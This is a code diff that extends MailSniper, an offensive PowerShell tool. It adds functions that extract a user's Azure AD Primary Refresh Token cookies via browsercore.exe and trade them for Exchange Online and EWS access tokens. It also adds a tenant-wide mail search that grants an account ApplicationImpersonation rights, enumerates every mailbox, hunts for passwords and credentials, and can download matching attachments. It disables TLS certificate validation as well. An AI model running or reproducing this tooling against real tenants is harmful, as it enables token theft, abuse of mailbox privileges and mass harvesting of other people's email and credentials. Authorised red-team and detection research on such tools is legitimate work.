@@ -1,3 +1,719 @@
+function Get-UserPRTToken {
+  <#
+  .SYNOPSIS
+  Gets user's PRT token from the Azure AD joined, Hybrid joined computer Or Azure AD registered computer.
+  This is a modified version of the Get-UserPRTToken by @NestoriSyynimaa https://github.com/Gerenios/AADInternals/blob/3bcc70dbc08360921d35af699c0753198b35aab0/PRT.ps1
+  Updater:Yan Linkov (Illusive Networks)
+  .DESCRIPTION
+   Gets user's PRT token from the Azure AD joined, Hybrid joined computer Or Azure AD registered computer.
+   Uses browsercore.exe to get the PRT token. 
+   **** please note that if more than one account is used for sso this will return an array of cookies e.g: multiple registered work accounts, that's why we use a login_hint when we use the cookies ****
+   
+#>
+  [cmdletbinding()]
+  Param([Parameter(Mandatory = $False)]
+    [String]$url = "`"https://login.microsoftonline.com`""
+  )
+  Process {
+    # There are two possible locations
+    $locations = @(
+      "$($env:ProgramFiles)\Windows Security\BrowserCore\browsercore.exe"
+      "$($env:windir)\BrowserCore\browsercore.exe"
+    )
+
+    # Check the locations
+    foreach ($file in $locations) {
+      if (Test-Path $file) {
+        $browserCore = $file
+        break
+      }
+    }
+
+    if (!$browserCore) {
+      throw "Browsercore not found! can't use SSO, use credentials instead!"
+    }
+
+    # Create the process
+    $p = New-Object System.Diagnostics.Process
+    $p.StartInfo.FileName = $browserCore
+    $p.StartInfo.UseShellExecute = $false
+    $p.StartInfo.RedirectStandardInput = $true
+    $p.StartInfo.RedirectStandardOutput = $true
+    $p.StartInfo.CreateNoWindow = $true
+
+    # Create the message body
+    $body = @"
+{"method": "GetCookies", "uri": $url, "sender": "https://login.microsoftonline.com"}
+"@
+      
+    # Start the process
+    $p.Start() | Out-Null
+    $stdin = $p.StandardInput
+    $stdout = $p.StandardOutput
+
+    # Write the input
+    $stdin.BaseStream.Write([bitconverter]::GetBytes($body.Length), 0, 4) 
+    $stdin.Write($body)
+    $stdin.Close()
+
+    # Read the output
+    $response = ""
+    while (!$stdout.EndOfStream) {
+      $response += $stdout.ReadLine()
+    }
+
+    Write-Debug "RESPONSE: $response"
+      
+    $p.WaitForExit()
+
+    # Strip the stuff from the beginning of the line
+    $response = $response.Substring($response.IndexOf("{")) | ConvertFrom-Json
+
+    # Check for error
+    if ($response.status -eq "Fail") {
+      Throw "Error getting PRT: $($response.code). $($response.description)"
+    }
+
+
+    # Return
+    return [System.Object[]]$response.response
+  }
+}
+
+function Get-HeadersWithPrtCookies {
+  <#
+  .SYNOPSIS
+  crates headers with PRT cookies for web request
+  Author:Yan Linkov (Illusive Networks)
+  .DESCRIPTION
+  Gets access token with PRT.
+  crates headers with PRT cookies for web request
+  
+#>
+  Param(
+    [Parameter(Mandatory = $True)]
+    [System.Object[]]$Cookies      
+  )
+  Process {
+    $Headers = @{
+      "User-Agent" = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; Tablet PC 2.0; Microsoft Outlook 16.0.4266)"
+    }
+    foreach ($Cookie in $Cookies) {
+      $Headers.add($Cookie.name, $Cookie.data)
+    }
+    return $Headers
+  }   
+}
+
+function Get-AccessTokenWithPRT {
+  <#
+  .SYNOPSIS
+  Gets access token with PRT.
+  This is a modified version of the Get-AccessTokenWithPRT by @NestoriSyynimaa https://github.com/Gerenios/AADInternals/blob/3bcc70dbc08360921d35af699c0753198b35aab0/PRT_Utils.ps1
+  .DESCRIPTION
+  Gets access token with PRT.
+  
+#>
+  [cmdletbinding()]
+  Param(
+    [Parameter(Mandatory = $True)]
+    [String]$LoginHint,
+    [Parameter(Mandatory = $True)]
+    [String]$Resource,
+    [Parameter(Mandatory = $True)]
+    [String]$ClientId,
+    [Parameter(Mandatory = $False)]
+    [String]$RedirectUri = [System.Web.HttpUtility]::UrlEncode("urn:ietf:wg:oauth:2.0:oob")
+  )
+  Process {
+    # get proof of possesion cookies
+    $Cookies = Get-UserPRTToken
+      
+    # Create url and headers
+    $Url = "https://login.microsoftonline.com/Common/oauth2/authorize?resource=$Resource&client_id=$ClientId&response_type=code&redirect_uri=$RedirectUri&login_hint=$LoginHint"
+
+    # build headers
+    $Headers = Get-HeadersWithPrtCookies -Cookies $Cookies 
+      
+    # Make the first request to get the authorization code (tries to redirect so throws an error)
+    $Response = Invoke-WebRequest -Uri $Url -Headers $Headers -MaximumRedirection 0 -ErrorAction SilentlyContinue
+    if ($Response.StatusCode -eq 200) {
+      Write-Host "[*] PRT Cookie is probably ok..."
+    }
+
+    #check if we need to ask a cookie for a new url with a proper request nonce
+    $Location = $Response.Headers.Location
+    if ($Response.StatusCode -eq 302 -and $Location) {
+      Write-Host "[*] probably bad cookie.. trying to renew..."
+
+      Write-Debug "location header: + $($Location)"
+
+      $Location = ("`"" + $Location + "`"")
+      $Cookies = Get-UserPRTToken -url $Location
+          
+      $Headers = Get-HeadersWithPrtCookies -Cookies $Cookies 
+         
+      $Response = Invoke-WebRequest -Uri $Url -Headers $Headers -MaximumRedirection 0 -ErrorAction SilentlyContinue
+    }
+
+    # Try to parse the code from the response
+    if ($Response.content) {
+      $Values = $Response.content.Split("?").Split("\")
+      foreach ($Value in $Values) {
+        $Row = $Value.Split("=")
+        if ($Row[0] -eq "code") {
+          $Code = $Row[1]
+          Write-Verbose "CODE: $Code"
+          break
+        }
+      }
+    }
+      
+
+    if (!$Code) {
+      write-host "Code not received! for account $LoginHint"
+      return
+    }
+
+    # Create the body
+    $body = @{
+      client_id    = $ClientId
+      grant_type   = "authorization_code"
+      code         = $Code
+      redirect_uri = [System.Web.HttpUtility]::UrlDecode($RedirectUri)
+    }
+
+    # Make the second request to get the access token
+    $Response = Invoke-RestMethod -Uri "https://login.microsoftonline.com/common/oauth2/token" -Body $body -ContentType "application/x-www-form-urlencoded" -Method Post
+      
+    # Return
+    return $Response
+          
+  }
+}
+
+function Get-ExchangeAccessToken {
+  <#
+  .SYNOPSIS
+    Gets an oauth access token with EWS Permissions based on user's PRT
+    Author: Yan Linkov (Illusive Networks)
+  
+  .PARAMETER AccountName
+  The account we want to get an access token for
+  .DESCRIPTION
+    Gets an acesss token to public office APP to obtain EWS permissions
+#>
+  [cmdletbinding()]
+  Param(
+    [Parameter(Mandatory = $True)]
+    [String]$AccountName
+  )
+  process {
+    $Resource = "https://outlook.office365.com"
+    $OfficeClientId = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
+      
+    # get access token to office app
+    $Authresponse = Get-AccessTokenWithPRT -Resource $Resource -ClientId $OfficeClientId -LoginHint $AccountName
+  
+    return $Authresponse
+  }
+ 
+}
+
+function Get-ExoPsAccessToken {
+  <#
+  .SYNOPSIS
+    Gets an oauth access token with Exchange Online Powershell Permissions based on user's PRT
+    Author: Yan Linkov (Illusive Networks)
+
+  .PARAMETER AccountName
+      The account we want to get an access token for
+
+  .DESCRIPTION
+    Gets an acesss token to Exchange Online Powershell APP to obtain exchange online administration permissions
+  #>
+  [cmdletbinding()]
+  Param(
+    [Parameter(Mandatory = $True)]
+    [String]$AccountName
+  )
+  process {
+    $Resource = "https://outlook.office365.com"
+    $ExoClientId = "a0c73c16-a7e3-4564-9a95-2bdf47383716"
+
+    # get access token to Exchange Online Powershell app
+    $Authresponse = Get-AccessTokenWithPRT -Resource $Resource -ClientId $ExoClientId -LoginHint $AccountName
+  
+    # access token, refresh token 
+    return  $Authresponse
+  }
+}
+
+function Invoke-GlobalO365MailSearch {
+  <#
+.SYNOPSIS
+
+  This module will connect to Exchange online 365 and grant the "ApplicationImpersonation" role to a specified user. Having the "ApplicationImpersonation" role allows that user to search through other domain user's mailboxes. After this role has been granted the Invoke-GlobalO365SearchFunction creates a list of all mailboxes in the Exchange database. The module then connects to Exchange Web Services using the impersonation role to gather a number of emails from each mailbox, and ultimately searches through them for specific terms.
+
+  This is a based on the original Invoke-GlobalMailSearch and has the same functionality except for the authentication
+
+  MailSniper Function: Invoke-GlobalO365MailSearch
+  Original Author: Beau Bullock (@dafthack)
+  Updater: Yan Linkov (Illusive Networks)
+  License: BSD 3-Clause
+  Required Dependencies: None
+  Optional Dependencies: None
+
+.DESCRIPTION
+
+  This module will connect to Exchange online 365 and grant the "ApplicationImpersonation" role to a specified user. Having the "ApplicationImpersonation" role allows that user to search through other domain user's mailboxes. After this role has been granted the Invoke-GlobalO365SearchFunction creates a list of all mailboxes in the Exchange database. The module then connects to Exchange Web Services using the impersonation role to gather a number of emails from each mailbox, and ultimately searches through them for specific terms.
+
+.PARAMETER ImpersonationAccount
+
+  Username of the current user account the PowerShell process is running as. This user will be granted the ApplicationImpersonation role on Exchange.
+.PARAMETER TimeOut
+  number of seconds to wait while exchange role assignment propogates.
+
+.PARAMETER ExchHostname
+
+  The hostname of the Exchange server to connect to.
+
+.PARAMETER AdminUserName
+
+  The username of an Exchange administrator (i.e. member of "Exchange Organization Administrators" or "Organization Management" group) including the domain (i.e. domain\adminusername).
+
+.PARAMETER AdminPassword
+
+  The Password to the Exchange administrator (i.e. member of "Exchange Organization Administrators" or "Organization Management" group) account specified with AdminUserName.
+
+.PARAMETER AutoDiscoverEmail
+
+  A valid email address that will be used to autodiscover where the Exchange server is located.
+
+.PARAMETER MailsPerUser
+
+  The total number of emails to return for each mailbox.
+
+.PARAMETER Terms
+
+  Certain terms to search through each email subject and body for. By default the script looks for "*password*","*creds*","*credentials*"
+
+.PARAMETER OutputCsv
+
+  Outputs the results of the search to a CSV file.
+
+.PARAMETER ExchangeVersion
+
+  In order to communicate with Exchange Web Services the correct version of Microsoft Exchange Server must be specified. By default this script tries "Exchange2010". Additional options to try are  Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013, or Exchange2013_SP1.
+
+.PARAMETER EmailList
+
+  A text file listing email addresses to search (one per line).
+
+.PARAMETER Folder
+
+  The folder of each mailbox to search. By default the script only searches the "Inbox" folder. By specifying 'all' for the Folder option all of the folders including subfolders of the specified mailbox will be searched.
+
+.PARAMETER Regex
+
+  The regex parameter allows for the use of regular expressions when doing searches. This will override the -Terms flag. 
+
+.PARAMETER CheckAttachments
+
+  If the CheckAttachments option is added MailSniper will attempt to search through the contents of email attachements in addition to the default body/subject. These attachments can be downloaded by specifying the -DownloadDir option. It only searches attachments that are of extension .txt, .htm, .pdf, .ps1, .doc, .xls, .bat, and .msg currently.
+
+.PARAMETER DownloadDir
+
+  When the CheckAttachments option finds attachments that are matches to the search terms the files can be downloaded to a specific location using the -DownloadDir option. 
+
+.PARAMETER UsePrtImperonsationAccount
+
+  Uses current user's PRT to to authenticate ImperonsationAccount.
+
+.PARAMETER AccessTokenImpersonationAccount
+  Use provided oauth access token to authenticate ImperonsationAccount.
+
+.PARAMETER UsePrtAdminAccount
+
+  Uses current user's PRT to to authenticate AdminAccount.
+
+.PARAMETER AccessTokenAdminAccount
+  Use provided oauth access token to authenticate ImperonsationAccount.
+
+.EXAMPLE
+
+ Invoke-GlobalO365MailSearch -ImpersonationAccount "victim@victims.com" -UsePrtImperonsationAccount -ExchHostname outlook.office365.com -AdminUserName "admin-victim@victims.com" -UsePrtAdminAccount
+#>
+
+
+  Param
+  (
+    [Parameter(Position = 0, Mandatory = $true)]
+    [string]
+    $ImpersonationAccount = "",
+
+    [Parameter(Position = 1, Mandatory = $false)]
+    [int]
+    $TimeOut = 120,
+
+    [Parameter(Position = 2, Mandatory = $false)]
+    [system.URI]
+    $ExchHostname = "outlook.ofiice365.com",
+
+    [Parameter(Position = 3, Mandatory = $True)]
+    [string]
+    $AdminUserName = "",
+
+    [Parameter(Position = 4, Mandatory = $false)]
+    [string]
+    $AdminPassword = "",
+
+    [Parameter(Position = 5, Mandatory = $False)]
+    [string[]]$Terms = ("*password*", "*creds*", "*credentials*"),
+
+    [Parameter(Position = 6, Mandatory = $False)]
+    [int]
+    $MailsPerUser = 100,
+
+    [Parameter(Position = 7, Mandatory = $False)]
+    [string]
+    $OutputCsv = "",
+
+    [Parameter(Position = 8, Mandatory = $False)]
+    [string]
+    $ExchangeVersion = "Exchange2013_SP1",
+
+    [Parameter(Position = 9, Mandatory = $False)]
+    [string]
+    $EmailList = "",
+
+    [Parameter(Position = 10, Mandatory = $False)]
+    [string]
+    $Folder = "Inbox",
+
+    [Parameter(Position = 11, Mandatory = $False)]
+    [string]
+    $Regex = '',
+
+    [Parameter(Position = 12, Mandatory = $False)]
+    [switch]
+    $CheckAttachments,
+
+    [Parameter(Position = 13, Mandatory = $False)]
+    [string]
+    $DownloadDir = "",
+
+    [Parameter(Position = 14, Mandatory = $False)]
+    [switch]
+    $UsePrtImperonsationAccount,
+
+    [Parameter(Position = 15, Mandatory = $False)]
+    [string]
+    $AccessTokenImpersonationAccount,
+
+    [Parameter(Position = 16, Mandatory = $False)]
+    [switch]
+    $UsePrtAdminAccount,
+
+    [Parameter(Position = 17, Mandatory = $False)]
+    [string]
+    $AccessTokenAdminAccount
+
+  )
+
+  #Check for a method of connecting to the Exchange Server
+  if ($ExchHostname -ne "") {
+    Write-Output ""
+  }
+  else {
+    Write-Output "[*] ExchHostname was not entered! falling back to default outlook.office365.com"
+  }
+
+  #Running the LoadEWSDLL function to load the required Exchange Web Services dll
+  LoadEWSDLL
+
+  #The specific version of Exchange must be specified
+  Write-Output "[*] Trying Exchange version $ExchangeVersion"
+  $ServiceExchangeVersion = [Microsoft.Exchange.WebServices.Data.ExchangeVersion]::$ExchangeVersion
+
+  ## Choose to ignore any SSL Warning issues caused by Self Signed Certificates      
+  ## Code From http://poshcode.org/624
+
+  ## Create a compilation environment
+  $Provider = New-Object Microsoft.CSharp.CSharpCodeProvider
+  $Compiler = $Provider.CreateCompiler()
+  $Params = New-Object System.CodeDom.Compiler.CompilerParameters
+  $Params.GenerateExecutable = $False
+  $Params.GenerateInMemory = $True
+  $Params.IncludeDebugInformation = $False
+  $Params.ReferencedAssemblies.Add("System.DLL") > $null
+
+  $TASource = @'
+namespace Local.ToolkitExtensions.Net.CertificatePolicy {
+  public class TrustAll : System.Net.ICertificatePolicy {
+    public TrustAll() { 
+    }
+    public bool CheckValidationResult(System.Net.ServicePoint sp,
+      System.Security.Cryptography.X509Certificates.X509Certificate cert, 
+      System.Net.WebRequest req, int problem) {
+      return true;
+    }
+  }
+}
+'@ 
+  $TAResults = $Provider.CompileAssemblyFromSource($Params, $TASource)
+  $TAAssembly = $TAResults.CompiledAssembly
+
+  ## We now create an instance of the TrustAll and attach it to the ServicePointManager
+  $TrustAll = $TAAssembly.CreateInstance("Local.ToolkitExtensions.Net.CertificatePolicy.TrustAll")
+  [System.Net.ServicePointManager]::CertificatePolicy = $TrustAll
+
+  ## end code from http://poshcode.org/624
+
+  $AdminToken = ""
+  if ($UsePrtAdminAccount) {
+    $AdminToken = $(Get-ExoPsAccessToken -AccountName $AdminUserName).access_token
+  }
+  elseif ($AccessTokenAdminAccount) {
+    $AdminToken = $AccessTokenAdminAccount
+  }
+
+  Get-PSSession -name exo* | Remove-PSSession -Confirm:$false
+
+  $Authorization = ""
+  if ($AdminToken -ne "") {
+    # Build the auth information
+    $Authorization = "Bearer {0}" -f $AdminToken
+  }
+  elseif ($AdminPassword) {
+    $Authorization = $AdminPassword
+  }
+
+  $UserId = $AdminUserName
+  
+  #create the "basic" token to send to O365 EXO
+  $Password = ConvertTo-SecureString -AsPlainText $Authorization -Force
+  $Credtoken = New-Object System.Management.Automation.PSCredential -ArgumentList $UserId, $Password
+  
+
+  
+  # Create and import the session
+  $Session = New-PSSession -Name EXO -ConfigurationName Microsoft.Exchange -ConnectionUri "https://$ExchHostname/PowerShell-LiveId?BasicAuthToOAuthConversion=true" -Credential $Credtoken -Authentication Basic -AllowRedirection -ErrorAction Stop
+  Import-Module (Import-PSSession $Session -AllowClobber) -Global -WarningAction 'SilentlyContinue'
+
+
+  #Allow user to impersonate other users
+  Write-Output "[*] Now granting the $ImpersonationAccount user ApplicationImpersonation rights!"
+  $ImpersonationAssignmentName = -join ((65..90) + (97..122) | Get-Random -Count 10 | % { [char]$_ })
+  New-ManagementRoleAssignment -Name:$ImpersonationAssignmentName -Role:ApplicationImpersonation -User:$ImpersonationAccount | Out-Null
+
+  #wait for role assingment to propogate  
+  write-host "[*] Exchange is taking its time to assign the ApplicationImpersonation role..wait $TimeOut sec.. or change the TimeOut parameter"
+  start-sleep -Seconds $TimeOut
+
+  $service = New-Object Microsoft.Exchange.WebServices.Data.ExchangeService($ServiceExchangeVersion)
+
+  #Using current user's credentials to connect to EWS
+
+  # Impersonation account credential
+  $Token = "" 
+  if ($UsePrtImperonsationAccount) {
+    $Token = $(Get-ExchangeAccessToken -AccountName $ImpersonationAccount).access_token
+  }
+  else {
+    $Token = $AccessTokenImpersonationAccount;  
+  }
+
+  if ($Token -ne "") {
+    $service.Credentials = [Microsoft.Exchange.WebServices.Data.OAuthCredentials]$Token
+  }
+  else {
+    write-host "[*] No Impersonation account credentials were supplied please authenticate"
+
+    $remotecred = Get-Credential -UserName $ImpersonationAccount -Message "[*] Please enter passowrd for $ImpersonationAccount"
+    $service.Credentials = $remotecred.GetNetworkCredential()
+  }
+
+  #Get a list of all mailboxes
+  if ($EmailList -ne "") {
+    $AllMailboxes = Get-Content -Path $EmailList
+    Write-Host "[*] The total number of mailboxes discovered is: " $AllMailboxes.count
+  }
+  else {
+    $SMTPAddresses = Get-Mailbox -ResultSize unlimited | Select Name -ExpandProperty PrimarySmtpAddress
+    $AllMailboxes = $SMTPAddresses -replace ".*:"
+    Write-Host "[*] The total number of mailboxes discovered is: " $AllMailboxes.count
+  }
+
+  #Set the Exchange Web Services URL 
+  if ($ExchHostname -ne "") {
+    ("[*] Using EWS URL " + "https://" + $ExchHostname + "/EWS/Exchange.asmx")
+    $service.Url = new-object System.Uri(("https://" + $ExchHostname + "/EWS/Exchange.asmx"))
+  }
+
+  Write-Host -foregroundcolor "yellow" "`r`n[*] Now connecting to EWS to search the mailboxes!`r`n"
+
+  #Search function searches through each mailbox one at a time
+  ForEach ($Mailbox in $AllMailboxes) {
+    $i++
+    Write-Host -NoNewLine ("[" + $i + "/" + $AllMailboxes.count + "]") -foregroundcolor "yellow"; Write-Output (" Using " + $ImpersonationAccount + " to impersonate " + $Mailbox)
+    $service.ImpersonatedUserId = New-Object Microsoft.Exchange.WebServices.Data.ImpersonatedUserId([Microsoft.Exchange.WebServices.Data.ConnectingIdType]::SmtpAddress, $Mailbox ); 
+    $rootFolder = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service, 'MsgFolderRoot')
+    $folderView = [Microsoft.Exchange.WebServices.Data.FolderView]100
+    $folderView.Traversal = 'Deep'
+    $rootFolder.Load()
+    if ($Folder -ne "all") {
+      $CustomFolderObj = $rootFolder.FindFolders($folderView) | Where-Object { $_.DisplayName -eq $Folder }
+    }
+    else {
+      $CustomFolderObj = $rootFolder.FindFolders($folderView) 
+    }
+    $PostSearchList = @() 
+    Foreach ($foldername in $CustomFolderObj) {
+      Write-Output "[***] Found folder: $($foldername.DisplayName)"
+  
+      try {
+        $Inbox = [Microsoft.Exchange.WebServices.Data.Folder]::Bind($service, $foldername.Id)
+      }
+      catch {
+        $ErrorMessage = $_.Exception.Message
+        if ($ErrorMessage -like "*Exchange Server doesn't support the requested version.*") {
+          Write-Output "[*] ERROR: The connection to Exchange failed using Exchange Version $ExchangeVersion."
+          Write-Output "[*] Try setting the -ExchangeVersion flag to the Exchange version of the server."
+          Write-Output "[*] Some options to try: Exchange2007_SP1, Exchange2010, Exchange2010_SP1, Exchange2010_SP2, Exchange2013, or Exchange2013_SP1."
+          break
+        }
+      }
+
+
+      $PropertySet = New-Object Microsoft.Exchange.WebServices.Data.PropertySet([Microsoft.Exchange.WebServices.Data.BasePropertySet]::FirstClassProperties)
+      $PropertySet.RequestedBodyType = [Microsoft.Exchange.WebServices.Data.BodyType]::Text
+   
+ 
+      try {
+        $mails = $Inbox.FindItems($MailsPerUser)
+      }
+      catch [Exception] {
+        Write-Host -foregroundcolor "red" ("[*] Warning: " + $Mailbox + " does not appear to have a mailbox.")
+        continue
+      }   
+      if ($regex -eq "") {
+        Write-Output ("[*] Now searching mailbox: $Mailbox for the terms $Terms.")
+      }
+      else {
+        Write-Output ("[*] Now searching the mailbox: $Mailbox with the supplied regular expression.")    
+      }
+
+      foreach ($item in $mails.Items) {    
+        $item.Load($PropertySet)
+        if ($Regex -eq "") {
+          foreach ($specificterm in $Terms) {
+            if ($item.Body.Text -like $specificterm) {
+              $PostSearchList += $item
+            }
+            elseif ($item.Subject -like $specificterm) {
+              $PostSearchList += $item
+            }
+          }
+        }
+        else {
+          foreach ($regularexpresion in $Regex) {
+            if ($item.Body.Text -match $regularexpresion) {
+              $PostSearchList += $item
+            }
+            elseif ($item.Subject -match $regularexpresion) {
+              $PostSearchList += $item
+            }
+          }    
+        }
+        if ($CheckAttachments) {
+          foreach ($attachment in $item.Attachments) {
+            if ($attachment -is [Microsoft.Exchange.WebServices.Data.FileAttachment]) {
+              if ($attachment.Name.Contains(".txt") -Or $attachment.Name.Contains(".htm") -Or $attachment.Name.Contains(".pdf") -Or $attachment.Name.Contains(".ps1") -Or $attachment.Name.Contains(".doc") -Or $attachment.Name.Contains(".xls") -Or $attachment.Name.Contains(".bat") -Or $attachment.Name.Contains(".msg")) {
+                $attachment.Load() | Out-Null
+                $plaintext = [System.Text.Encoding]::ASCII.GetString($attachment.Content)
+                if ($Regex -eq "") {
+                  foreach ($specificterm in $Terms) {
+                    if ($plaintext -like $specificterm) {
+                      Write-Output ("Found attachment " + $attachment.Name)
+                      $PostSearchList += $item
+                      if ($DownloadDir -ne "") { 
+                        $prefix = Get-Random
+                        $DownloadFile = new-object System.IO.FileStream(($DownloadDir + "\" + $prefix + "-" + $attachment.Name.ToString()), [System.IO.FileMode]::Create)
+                        $DownloadFile.Write($attachment.Content, 0, $attachment.Content.Length)
+                        $DownloadFile.Close()
+                      }
+                    }
+                    elseif ($plaintext -like $specificterm) {
+                      Write-Output ("Found attachment " + $attachment.Name)
+                      $PostSearchList += $item
+                      if ($DownloadDir -ne "") { 
+                        $prefix = Get-Random
+                        $DownloadFile = new-object System.IO.FileStream(($DownloadDir + "\" + $prefix + $attachment.Name.ToString()), [System.IO.FileMode]::Create)
+                        $DownloadFile.Write($attachment.Content, 0, $attachment.Content.Length)
+                        $DownloadFile.Close()
+                      }
+                    }
+                  }
+                }
+                else {
+                  foreach ($regularexpresion in $Regex) {
+                    if ($plaintext -match $regularexpresion) {
+                      Write-Output ("Found attachment " + $attachment.Name)
+                      $PostSearchList += $item
+                      if ($DownloadDir -ne "") { 
+                        $prefix = Get-Random
+                        $DownloadFile = new-object System.IO.FileStream(($DownloadDir + "\" + $prefix + $attachment.Name.ToString()), [System.IO.FileMode]::Create)
+                        $DownloadFile.Write($attachment.Content, 0, $attachment.Content.Length)
+                        $DownloadFile.Close()
+                      }
+                    }
+                    elseif ($plaintext -match $regularexpresion) {
+                      Write-Output ("Found attachment " + $attachment.Name)
+                      $PostSearchList += $item
+                      if ($DownloadDir -ne "") { 
+                        $prefix = Get-Random
+                        $DownloadFile = new-object System.IO.FileStream(($DownloadDir + "\" + $prefix + $attachment.Name.ToString()), [System.IO.FileMode]::Create)
+                        $DownloadFile.Write($attachment.Content, 0, $attachment.Content.Length)
+                        $DownloadFile.Close()
+                      }
+                    }
+                  }    
+                }
+              }
+            }
+          }
+        }
+      }
+
+    }
+     
+    if ($OutputCsv -ne "") { 
+      $TempOutputCsv = "$OutputCsv$(".temp")"
+      $PostSearchList | % { $_.Body = $_.Body -replace "`r`n", '\n' -replace ",", '&#44;' }
+      $PostSearchList | Select-Object Sender, ReceivedBy, Subject, Body | Export-Csv $TempOutputCsv -encoding "UTF8"
+      if ($TempOutputCsv) {
+        Import-Csv $TempOutputCsv | ConvertTo-Csv -NoTypeInformation | Select-Object -Skip 1 | Out-File -Encoding ascii -Append $OutputCsv
+        Remove-Item $TempOutputCsv
+      }
+    }
+    else {
+      $PostSearchList | ft -Property Sender, ReceivedBy, Subject, Body | Out-String
+    }
+  }
+
+  if ($OutputCsv -ne "") {
+    $filedata = Import-Csv $OutputCsv -Header Sender , ReceivedBy , Subject , Body
+    $filedata | Export-Csv $OutputCsv -NoTypeInformation
+    Write-Host -foregroundcolor "yellow" "`r`n[*] Results have been output to $OutputCsv"
+  }
+  #Remove User from impersonation role
+  Write-Output "`r`n[*] Removing ApplicationImpersonation role from $ImpersonationAccount."
+  Get-ManagementRoleAssignment -RoleAssignee $ImpersonationAccount -Role ApplicationImpersonation -RoleAssigneeType user | Remove-ManagementRoleAssignment -confirm:$false
+
+
+}
+
 function Invoke-GlobalMailSearch{
 <#
   .SYNOPSIS
@@ -509,12 +1225,13 @@ $TASource=@'
        
     if ($OutputCsv -ne "")
     { 
+      $TempOutputCsv = "$OutputCsv$(".temp")"
       $PostSearchList | %{ $_.Body = $_.Body -replace "`r`n",'\n' -replace ",",'&#44;'}
-      $PostSearchList | Select-Object Sender,ReceivedBy,Subject,Body | Export-Csv "temp-$OutputCsv" -encoding "UTF8"
-        if ("temp-$OutputCsv")
+      $PostSearchList | Select-Object Sender,ReceivedBy,Subject,Body | Export-Csv $TempOutputCsv -encoding "UTF8"
+        if ($TempOutputCsv)
         {
-          Import-Csv "temp-$OutputCsv" | ConvertTo-Csv -NoTypeInformation | Select-Object -Skip 1 | Out-File -Encoding ascii -Append $OutputCsv
-          Remove-Item "temp-$OutputCsv"
+          Import-Csv $TempOutputCsv | ConvertTo-Csv -NoTypeInformation | Select-Object -Skip 1 | Out-File -Encoding ascii -Append $OutputCsv
+          Remove-Item $TempOutputCsv
         }
     }
     else
@@ -531,7 +1248,7 @@ $TASource=@'
   }
   #Remove User from impersonation role
   Write-Output "`r`n[*] Removing ApplicationImpersonation role from $ImpersonationAccount."
-  Get-ManagementRoleAssignment -RoleAssignee $ImpersonationAccount -Role ApplicationImpersonation -RoleAssigneeType user | Remove-ManagementRoleAssignment -confirm:$fals
+  Get-ManagementRoleAssignment -RoleAssignee $ImpersonationAccount -Role ApplicationImpersonation -RoleAssigneeType user | Remove-ManagementRoleAssignment -confirm:$false
 
 }
 
@@ -547,6 +1264,9 @@ function Invoke-SelfSearch{
     License: BSD 3-Clause
     Required Dependencies: None
     Optional Dependencies: None
+
+    Updated: added oauth access tokens suport and SSO based support via primary refresh token for extra O365 leverage (UsePrt, AccessToken flags)
+    Updater: Yan Linkov (Illusive Networks)
 
   .DESCRIPTION
 
@@ -595,7 +1315,13 @@ function Invoke-SelfSearch{
   .PARAMETER DownloadDir
 
     When the CheckAttachments option finds attachments that are matches to the search terms the files can be downloaded to a specific location using the -DownloadDir option.
-      
+
+  .PARAMETER UsePrt
+
+    Uses current user's PRT to authenticate.
+
+  .PARAMETER AccessToken
+    Use provided oauth access token to authenticate.    
 
   .EXAMPLE
 
@@ -693,7 +1419,15 @@ function Invoke-SelfSearch{
 
     [Parameter(Position = 11, Mandatory = $False)]
     [switch]
-    $OtherUserMailbox
+    $OtherUserMailbox,
+
+    [Parameter(Position = 12, Mandatory = $False)]
+    [switch]
+    $UsePrt,
+
+    [Parameter(Position = 13, Mandatory = $False)]
+    [string]
+    $AccessToken
 
   )
   #Running the LoadEWSDLL function to load the required Exchange Web Services dll
@@ -710,6 +1444,17 @@ function Invoke-SelfSearch{
     $remotecred = Get-Credential
     $service.UseDefaultCredentials = $false
     $service.Credentials = $remotecred.GetNetworkCredential()
+  }
+  elseif ($UsePrt) 
+  {
+    #Get oauth access token with EWS permissions via office native app
+    $token = $(Get-ExchangeAccessToken -AccountName $Mailbox).access_token
+    $service.Credentials = [Microsoft.Exchange.WebServices.Data.OAuthCredentials]$token
+  }
+  elseif ($AccessToken) 
+  {
+    #Use provided oauth access token
+    $service.Credentials = [Microsoft.Exchange.WebServices.Data.OAuthCredentials]$AccessToken
   }
   else
   {
@@ -1078,6 +1823,7 @@ function Get-MailboxFolders{
 
     MailSniper Function: Get-MailboxFolders
     Author: Beau Bullock (@dafthack)
+    Updater: Yan Linkov (Illusive Networks)
     License: BSD 3-Clause
     Required Dependencies: None
     Optional Dependencies: None
@@ -1105,6 +1851,13 @@ function Get-MailboxFolders{
   .PARAMETER Remote
 
     A switch for performing the search remotely across the Internet against a system hosting EWS. Instead of utilizing the current user's credentials if the -Remote option is added a new credential box will pop up for accessing the remote EWS service. 
+    
+  .PARAMETER UsePrt
+
+    Uses current user's PRT to authenticate.
+
+  .PARAMETER AccessToken
+    Use provided oauth access token to authenticate.
   
   .EXAMPLE
 
@@ -1143,7 +1896,15 @@ function Get-MailboxFolders{
 
     [Parameter(Position = 4, Mandatory = $False)]
     [switch]
-    $Remote
+    $Remote,
+
+    [Parameter(Position = 5, Mandatory = $False)]
+    [switch]
+    $UsePrt,
+
+    [Parameter(Position = 6, Mandatory = $False)]
+    [string]
+    $AccessToken
 
   )
   #Running the LoadEWSDLL function to load the required Exchange Web Services dll
@@ -1160,6 +1921,17 @@ function Get-MailboxFolders{
     $remotecred = Get-Credential
     $service.UseDefaultCredentials = $false
     $service.Credentials = $remotecred.GetNetworkCredential()
+  }
+  elseif ($UsePrt) 
+  {
+
+    # use the access token as credential
+    $token = $(Get-ExchangeAccessToken -AccountName $Mailbox).access_token
+    $service.Credentials = [Microsoft.Exchange.WebServices.Data.OAuthCredentials]$token
+  }
+  elseif ($AccessToken) 
+  {
+    $service.Credentials = [Microsoft.Exchange.WebServices.Data.OAuthCredentials]$AccessToken
   }
   else
   {
@@ -2659,6 +3431,7 @@ function Invoke-OpenInboxFinder{
 
     MailSniper Function: Invoke-OpenInboxFinder
     Author: Beau Bullock (@dafthack)
+    Updater: Yan Linkov (Illusive Networks)
     License: MIT
     Required Dependencies: None
     Optional Dependencies: None
@@ -2694,6 +3467,14 @@ function Invoke-OpenInboxFinder{
